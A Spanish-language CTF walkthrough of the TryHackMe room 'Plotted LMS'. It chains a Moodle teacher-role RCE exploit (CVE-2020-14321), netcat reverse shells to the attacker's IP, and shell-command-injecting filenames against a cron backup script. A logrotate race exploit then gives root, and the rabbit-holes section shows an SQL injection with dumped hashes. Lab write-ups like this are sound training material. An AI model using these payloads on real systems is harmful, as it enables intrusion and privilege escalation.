---
title : "Plotted LMS - Write Up - Español"
date : 2022-04-24T17:17:40+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel difícil en TryHackMe."
tags : ["Enumeration","cronjobs","Code-Injection","logrotten","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/plottedlms)  | Difícil  |  [sa.infinity8888](https://tryhackme.com/p/sa.infinity8888)  |


## Reconocimiento

¡Hola, bienvenido de nuevo a mi blog! ¡Hoy estamos jugando con una máquina de nivel Difícil creada por el creador de la serie "Plotted" [sa.infinity8888](https://tryhackme.com/p/sa.infinity8888)!

¡Empecemos a enumerar!

```bash
╰─ map  10.10.210.16                                                                             ─╯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 11:50 CEST
Nmap scan report for 10.10.210.16
Host is up (0.11s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 67:af:92:c1:f0:9f:8a:18:62:8d:bf:ba:c4:58:8d:52 (RSA)
|   256 03:ca:42:df:ef:4b:3e:e6:91:0e:b2:bc:b4:42:1e:d1 (ECDSA)
|_  256 f1:ed:8a:8d:e4:87:d8:c7:69:c1:ca:2b:a4:dc:0c:dc (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
873/tcp  open  http    Apache httpd 2.4.52 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.52 (Debian)
8820/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9020/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.95 seconds
```

Enumeramos todos los puertos web y servicios que se ejecutan en la máquina. En resumen, esto es lo que encontramos:

|Puerto|Servicio|Plataforma|
|----|-------|--------------|
| 80 | Apache| N/A          |
| 873| Apache| Online Railway Reservation System V.1.0 |
| 8820 | Apache | Learning Managment System V.?? |
| 9020 | Apache | Moodle V.3.9.0-beta| 

Los puertos `873/8820` tenían algunas vulnerabilidades comunes, pero el creador las arregló, cuando intentabas explotar cualquier cosa, obtenías algo como "¡Confía en mí, no es tan fácil!"("Trust me, it is not this easy!!!")

Así que escaneamos el puerto `9020`.

```bash
╰─ python3 moodlescan.py -u http://10.10.220.166:9020/moodle/                                                                          ─╯


 .S_SsS_S.     sSSs_sSSs      sSSs_sSSs     .S_sSSs    S.        sSSs    sSSs    sSSs   .S_SSSs     .S_sSSs
.SS~S*S~SS.   d%%SP~YS%%b    d%%SP~YS%%b   .SS~YS%%b   SS.      d%%SP   d%%SP   d%%SP  .SS~SSSSS   .SS~YS%%b
S%S `Y' S%S  d%S'     `S%b  d%S'     `S%b  S%S   `S%b  S%S     d%S'    d%S'    d%S'    S%S   SSSS  S%S   `S%b
S%S     S%S  S%S       S%S  S%S       S%S  S%S    S%S  S%S     S%S     S%|     S%S     S%S    S%S  S%S    S%S
S%S     S%S  S&S       S&S  S&S       S&S  S%S    S&S  S&S     S&S     S&S     S&S     S%S SSSS%S  S%S    S&S
S&S     S&S  S&S       S&S  S&S       S&S  S&S    S&S  S&S     S&S_Ss  Y&Ss    S&S     S&S  SSS%S  S&S    S&S
S&S     S&S  S&S       S&S  S&S       S&S  S&S    S&S  S&S     S&S~SP  `S&&S   S&S     S&S    S&S  S&S    S&S
S&S     S&S  S&S       S&S  S&S       S&S  S&S    S&S  S&S     S&S       `S*S  S&S     S&S    S&S  S&S    S&S
S*S     S*S  S*b       d*S  S*b       d*S  S*S    d*S  S*b     S*b        l*S  S*b     S*S    S&S  S*S    S*S
S*S     S*S  S*S.     .S*S  S*S.     .S*S  S*S   .S*S  S*S.    S*S.      .S*P  S*S.    S*S    S*S  S*S    S*S
S*S     S*S   SSSbs_sdSSS    SSSbs_sdSSS   S*S_sdSSS    SSSbs   SSSbs  sSS*S    SSSbs  S*S    S*S  S*S    S*S
SSS     S*S    YSSP~YSSY      YSSP~YSSY    SSS~YSSY      YSSP    YSSP  YSS'      YSSP  SSS    S*S  S*S    SSS
        SP                                                                                    SP   SP
        Y                                                                                     Y    Y

Version 0.8 - May/2021
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://10.10.220.166:9020/moodle/ ...

server          : Apache/2.4.41 (Ubuntu)
x-frame-options : sameorigin
last-modified   : Mon, 25 Apr 2022 13:50:09 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```

El escaneo no nos dio nada, era una plataforma `Moodle` normal, así que comenzamos la fase de reconocimiento con una cuenta creada por nosotros mismos. Y encontramos un curso con el nombre "--Solo profesores--"("--Teachers Only--") y una Autoinscripción con el rol de Profesor dentro de ese curso. Era extraño, así que una búsqueda rápida en Google nos dio el siguiente paso.

![teacher_role](teacher_role.png)

## Acceso inicial - Usuario

Descubrimos que para `Moodle versión 3.9` hay un exploit RCE si tiene el rol de Profesor. (CVE-2020-14321).

¡Y teníamos ese rol!

Así que descargamos el exploit desde [aquí](https://github.com/HoangKien1020/CVE-2020-14321) y lo ejecutamos contra la máquina.

```bash
╰─ python3 exploit_mo.py -url http://10.10.93.142:9020/moodle/ -cookie=darsatmvtl2kanukccuur10den -cmd=ls                                                                                                ─╯
                           ***CVE 2020 14321***
    How to use this PoC script
    Case 1. If you have vaid credentials:
    python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd=dir
    Case 2. If you have valid cookie:
    python3 cve202014321.py -u http://test.local:8080 -cookie=37ov37abn9kv22gj7enred9bl7 -cmd=dir

[+] Your target: http://10.10.93.142:9020/moodle/
[+] Logging in to teacher
[+] Teacher logins successfully!
[+] Privilege Escalation To Manager in the course Done!
[+] Maybe RCE via install plugins!
[+] Checking RCE ...
[+] RCE link in here:
http://10.10.93.142:9020/moodle//blocks/rce/lang/en/block_rce.php?cmd=ls
block_rce.php
```
¡Sí! ¡Ya tenemos RCE! Entonces unimos una capa inversa.

```bash
======== Terminal 1 =========
╰─ curl -v http://10.10.169.13:9020/moodle/blocks/rce/lang/en/block_rce.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.9.0.241%201337%20%3E%2Ftmp%2Ff
*   Trying 10.10.169.13:9020...
* Connected to 10.10.169.13 (10.10.169.13) port 9020 (#0)
> GET /moodle/blocks/rce/lang/en/block_rce.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.9.0.241%201337%20%3E%2Ftmp%2Ff HTTP/1.1
> Host: 10.10.169.13:9020
> User-Agent: curl/7.74.0
> Accept: */*
>


======== Terminal 2 =========
╰─ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.9.0.241] from (UNKNOWN) [10.10.169.13] 35964
bash: cannot set terminal process group (748): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$
```
Pero no podemos leer la flag del usuario...

Entonces, ¡escaneemos la máquina nuevamente para escalar nuestros privilegios al usuario `plot_admin`!

Encontramos un script de copia de seguridad en el directorio `home` del usuario...

```bash
www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$ cat /home/plot_admin/backup.py
import os

moodle_location = "/var/www/uploadedfiles/filedir/"
backup_location = "/home/plot_admin/.moodle_backup/"

os.system("/usr/bin/rm -rf " + backup_location + "*")

for (root,dirs,files) in os.walk(moodle_location):
    for file in files:
        os.system('/usr/bin/cp "' + root + '/' + file + '" ' + backup_location)
```

No es un script muy seguro, pero no podemos hacer nada con él, a menos que tengamos un `cronjob` ejecutándolo...

```bash
www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
* * * * *   plot_admin /usr/bin/python3 /home/plot_admin/backup.py
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *   root    /usr/bin/rsync /var/log/apache2/m*_access /home/plot_admin/.logs_backup/$(/bin/date +%m.%d.%Y); /usr/bin/chown -R plot_admin:plot_admin /home/plot_admin/.logs_backup/$(/bin/date +%m.%d.%Y)
#
```

¡¡Y hay un `cronjob` ejecutándolo con el usuario `plot_admin`!!

Entonces, si revisamos el script `backup.py`, hay 2 variables:

`moodle_location` y `backup_location`

¡Tenemos permisos de escritura sobre la `ruta` a la que apunta la variable `moodle_location`!

¡Y dado que esa variable no se está sanitizando, podemos inyectar código malicioso y se ejecutará ya que el script está usando la función `os.system`!

Así que básicamente creamos un archivo con el nombre `"|chmod -R 777 .|"` ¿qué hará este nombre de archivo? Romperá el código y, dado que tenemos el carácter de barra vertical (pipe) [|], en Linux se usa para ejecutar otro comando después del actual. ¡Otorgamos permiso `L-E-X` a todos para el directorio `home` del usuario `plot_admin`!

```bash
www-data@plotted-lms://var/www/uploadedfiles/filedir$ ls -la
total 44
-rw-r--r--  1 www-data www-data    5 Apr 24 09:30 '"|chmod -R 777 .|"'
drwxrwxrwx  9 www-data www-data 4096 Apr 24 09:30  .
drwxrwxrwx 10 www-data www-data 4096 Jan 31 10:54  ..
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  0c
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  5f
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  75
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  8c
drwxrwxrwx  3 www-data www-data 4096 Apr 24 09:27  bf
drwxrwxrwx  3 www-data www-data 4096 Feb  4 07:14  d9
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  da
-rw-rw-rw-  1 www-data www-data  168 Jan 31 10:52  warning.txt
```

Después de esto, creamos una shell reversa simple y lo copiamos en el directorio `home` del usuario, luego usamos la misma técnica para ejecutar este script como `plot_admin`.

```bash
www-data@plotted-lms://var/www/uploadedfiles/filedir$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.9.0.241 1338 >/tmp/f" > exploit.sh

www-data@plotted-lms://var/www/uploadedfiles/filedir$ mv exploit.sh /home/plot_admin/exploit.sh

www-data@plotted-lms://var/www/uploadedfiles/filedir$ echo "test" > '"|bash exploit.sh|"'

www-data@plotted-lms://var/www/uploadedfiles/filedir$ ls -la
total 48
-rw-r--r--  1 www-data www-data    5 Apr 24 09:30 '"|bash exploit.sh|"'
-rw-r--r--  1 www-data www-data    5 Apr 24 09:30 '"|chmod -R 777 .|"'
drwxrwxrwx  9 www-data www-data 4096 Apr 24 09:30  .
drwxrwxrwx 10 www-data www-data 4096 Jan 31 10:54  ..
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  0c
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  5f
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  75
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  8c
drwxrwxrwx  3 www-data www-data 4096 Apr 24 09:27  bf
drwxrwxrwx  3 www-data www-data 4096 Feb  4 07:14  d9
drwxrwxrwx  3 www-data www-data 4096 Jan 31 10:54  da
-rw-rw-rw-  1 www-data www-data  168 Jan 31 10:52  warning.txt
```

Después de un minuto _(otra vez)_ recibimos la conexión inversa

```bash
╰─ nc -nlvp 1338                                                                                                                                                            
listening on [any] 1338 ...
connect to [10.9.0.241] from (UNKNOWN) [10.10.93.142] 52772
bash: cannot set terminal process group (3138): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted-lms:~$ id; whoami; pwd; cat /home/plot_admin/user.txt
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
plot_admin
/home/plot_admin
7[REDACTADO]0
```
¡Sí! ¡Lo hicimos!

Ahora vamos a rootear esta máquina 😎

## Root

Esta parte de la máquina, tomó un tiempo descifrarla, demasiado pensamiento :/

¡Pero lo dejarémos claro y directo!

Usamos `linpeas` para escanear la máquina y descubrimos lo siguiente:

`Linpeas` nos muestra que hay un script que se ejecuta demasiadas veces durante de 1 minuto:


```bash
[...]
╔══════════╣ Different processes executed during 1 min (interesting is low number of repetitions)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
    287 /lib/systemd/systemd --user
    286 (sd-pam)
     31 /usr/bin/ssh root@127.0.0.1 . /etc/bash_completion
     31 /bin/sh -c /usr/bin/ssh root@127.0.0.1 '. /etc/bash_completion'
[...]
```

Hay una secuencia de comandos que ejecuta `ssh` como root para `localhost` y pasa la carpeta `bash_completion` como argumento... Extraño... 

Verificando los procesos de las máquinas descubrimos lo siguiente

```bash
[...]
root        5322     597  0 10:12 ?        00:00:00  \_ /usr/sbin/CRON -f
plot_ad+    5347    5322  0 10:12 ?        00:00:00  |   \_ /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
plot_ad+    5348    5347  0 10:12 ?        00:00:02  |       \_ /usr/bin/python3 /home/plot_admin/backup.py
root        5482     597  0 10:13 ?        00:00:00  \_ /usr/sbin/CRON -f
plot_ad+    5548    5482  0 10:13 ?        00:00:00  |   \_ /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
plot_ad+    5558    5548  1 10:13 ?        00:00:02  |       \_ /usr/bin/python3 /home/plot_admin/backup.py
root        5633     597  0 10:14 ?        00:00:00  \_ /usr/sbin/CRON -f
plot_ad+    5651    5633  0 10:14 ?        00:00:00  |   \_ /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
plot_ad+    5656    5651  1 10:14 ?        00:00:01  |       \_ /usr/bin/python3 /home/plot_admin/backup.py
root        5705     597  0 10:15 ?        00:00:00  \_ /usr/sbin/CRON -f
plot_ad+    5817    5705  0 10:16 ?        00:00:00  |   \_ /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
plot_ad+    5832    5817  0 10:16 ?        00:00:00  |       \_ /usr/bin/python3 /home/plot_admin/backup.py
root        5706     597  0 10:15 ?        00:00:00  \_ /usr/sbin/CRON -f
root        5781    5706  0 10:16 ?        00:00:00  |   \_ /bin/sh -c /usr/bin/ssh root@127.0.0.1 '. /etc/bash_completion'
root        5793    5781  0 10:16 ?        00:00:00  |       \_ /usr/bin/ssh root@127.0.0.1 . /etc/bash_completion
root        5774     597  0 10:16 ?        00:00:00  \_ /usr/sbin/CRON -f
plot_ad+    5851    5774  0 10:16 ?        00:00:00  |   \_ /usr/sbin/CRON -f
root        5775     597  0 10:16 ?        00:00:00  \_ /usr/sbin/CRON -f
root        5840    5775  0 10:16 ?        00:00:00  |   \_ /bin/sh -c /usr/bin/ssh root@127.0.0.1 '. /etc/bash_completion'
root        5844    5840  1 10:16 ?        00:00:00  |       \_ /usr/bin/ssh root@127.0.0.1 . /etc/bash_completion
root        5776     597  0 10:16 ?        00:00:00  \_ /usr/sbin/CRON -f
root        5845    5776  0 10:16 ?        00:00:00      \_ /bin/sh -c /usr/local/sbin/logrotate -f /etc/logbackup.cfg
root        5848    5845  0 10:16 ?        00:00:00          \_ /usr/local/sbin/logrotate -f /etc/logbackup.cfg
[...]
```

¡Hay un cronjob para `logrotate` en uso!

Sabemos que hay una manera de escalar privilegios con él, si se cumplen algunas condiciones...

¡Intentemos ver el archivo de configuración y la versión!

```bash
(remote) plot_admin@plotted-lms:/tmp$ ls -la /etc/logbackup.cfg
-rw-r--r-- 1 root root 86 Feb  6 03:29 /etc/logbackup.cfg

(remote) plot_admin@plotted-lms:/tmp$ cat /etc/logbackup.cfg
/home/plot_admin/.logs_backup/moodle_access {
    hourly
    missingok
    rotate 50
    create
}

(remote) plot_admin@plotted-lms:/tmp$ logrotate --version
logrotate 3.15.0

    Default mail command:       /bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate.status
    ACL support:                no
    SELinux support:            no
```

¡¡Estupendo!! Tenemos la versión `3.15.0` (Vulnerable) y podemos leer el archivo de configuración, ¡el argumento `create` está en uso!

Si no sabe cómo explotar esta vulnerabilidad, [aquí hay una buena explicación al respecto](https://medium.com/r3d-buck3t/linux-privesc-with-logrotate-utility-219b3aa7476b).

Si no tiene ganas de leer tanto, aquí hay un breve resumen de lo que vamos a hacer:

Modificaremos el archivo (`/home/plot_admin/.logs_backup/moodle_access`) para que `logrotate` detecte este cambio y podamos obtener nuestra shell reversa. Para explotar esto, vamos a usar [logrotten](https://github.com/whotwagner/logrotten).

_Por cierto, creé una shell reversa con el nombre `shell.sh` en la carpeta actual. (Lo siento, olvidé el fragmento :/)_

```bash
======== Terminal 1 =========
(remote) plot_admin@plotted-lms:/tmp$ cp /home/plot_admin/.logs_backup/02.06.2022 /home/plot_admin/.logs_backup/moodle_access; ./logrotten -p shell.sh /home/plot_admin/.logs_backup/moodle_access
Waiting for rotating /home/plot_admin/.logs_backup/moodle_access...
Renamed /home/plot_admin/.logs_backup with /home/plot_admin/.logs_backup2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!

======== Terminal 2 =========
╰─ pwncat-cs -lp 1338                                                                                                                  ─╯
[01:13:10 PM] Welcome to pwncat 🐈!                                                                                        __main__.py:164
[01:13:58 PM] received connection from 10.10.37.208:51952                                                                       bind.py:84
[01:14:00 PM] 10.10.37.208:51952: registered new host w/ db                                                                 manager.py:957
(local) pwncat$ back
(remote) root@plotted-lms:/root# id; whoami;pwd; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
root
/root
Congratulations on completing this room!

flag - 2[REDACTADO]2

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms
-sa.infinity8888
```

¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!

## Posibles agujeros de conejos (MISC)


### Rails

En el puerto 873, hay una inyección de SQL en el parámetro SID, no necesita estar autenticado para explotarlo. (También hay 2-3 exploits más, pero el creador los parcheó)

https://packetstormsecurity.com/files/165493/Online-Railway-Reservation-System-1.0-SQL-Injection.html

Aquí está el resultado, no pudimos descifrar ese hash :/

Si pudiste hacerlo, por favor pingeame y dime si hay algún otro exploit posible.

```bash
Database: orrs
Table: users
[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5765dcb76627ba4e2fd673e073def4ae |
+----------+----------------------------------+
```

Además, si enumeras un poco más ese puerto, encontrarás el archivo `orrs_db.sql`, es la exportación de la base de datos `orrs`. Tiene algunas credenciales para los usuarios.

```bash
+----------+---------------------------------------------+
| username | password                                    |
+----------+---------------------------------------------+
| admin    | 0192023a7bbd73250516f069df18b500 (admin123) |
| slou     | 1ed1255790523a907da869eab7306f5a (slou123)  |
+----------+---------------------------------------------+
```

### General 404/403/503 errors

Cuando llegas a una página que no existe (error 404), te redirige a un link de Youtube :p

```bash
╰─ curl http://10.10.220.166:9020/notreal | base64 -d                                                                                  ─╯
Try Harder!
Anyways here you go :D
https://www.youtube.com/watch?v=dQw4w9WgXcQ#
```

Y para que conste, porque no recuerdo la URL, hay un error que te dice que intentes con `admin:admin` \-\_\_\-


### Priv Escalation a root

Existe este cronjob para root, pero creemos que es solo una agujero de conejo, no estábamos 100% seguros de eso, pero no encontramos ningún exploit/vulnerabilidad para esto.

```bash
plot_admin@plotted-lms:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
[...]
* * * * *   root    /usr/bin/rsync /var/log/apache2/m*_access /home/plot_admin/.logs_backup/$(/bin/date +%m.%d.%Y); /usr/bin/chown -R plot_admin:plot_admin /home/plot_admin/.logs_backup/$(/bin/date +%m.%d.%Y)
#
```